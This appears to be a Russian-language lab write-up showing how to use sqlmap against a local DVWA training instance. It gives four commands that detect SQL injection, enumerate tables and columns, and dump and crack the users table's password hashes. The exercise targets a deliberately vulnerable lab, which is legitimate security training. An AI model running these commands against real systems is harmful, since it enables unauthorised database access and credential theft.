# SqlMap
### Используем команду для поиска SQL-инъекций

```
sqlmap -u 'http://dvwa.local/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='PHPSESSID=h7b79417e8om8h6ppsj109t0pl; security=low' -p 'id' --dbms='mysql' --level=3
```
![image](https://github.com/Nom1o/Secure_Software_Practice-4/assets/125586725/c76a701b-778f-4aea-9240-fa2c87a10fa2)

 
### Определим таблицы в базе данных dvwa
```
sqlmap -u 'http://dvwa.local/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='PHPSESSID=h7b79417e8om8h6ppsj109t0pl; security=low' -D dvwa --tables
```
![image](https://github.com/Nom1o/Secure_Software_Practice-4/assets/125586725/6a2aa11a-2270-41dc-9b91-e08e23e9d399)

### Получим все колноки в таблице users
```
sqlmap -u 'http://dvwa.local/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='PHPSESSID=h7b79417e8om8h6ppsj109t0pl; security=low' -D dvwa -T users –column
```
![image](https://github.com/Nom1o/Secure_Software_Practice-4/assets/125586725/ed8bac6a-d45c-4583-afd1-6d11a1558753)

### Выведем соержимое таблицы в который хэш паролей взламывается для получения результата:
```
sqlmap -u 'http://dvwa.local/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='PHPSESSID=h7b79417e8om8h6ppsj109t0pl; security=low' -D dvwa -T users -C user,password --dump
```
![image](https://github.com/Nom1o/Secure_Software_Practice-4/assets/125586725/47112109-5128-470e-bbd1-89388be04283)





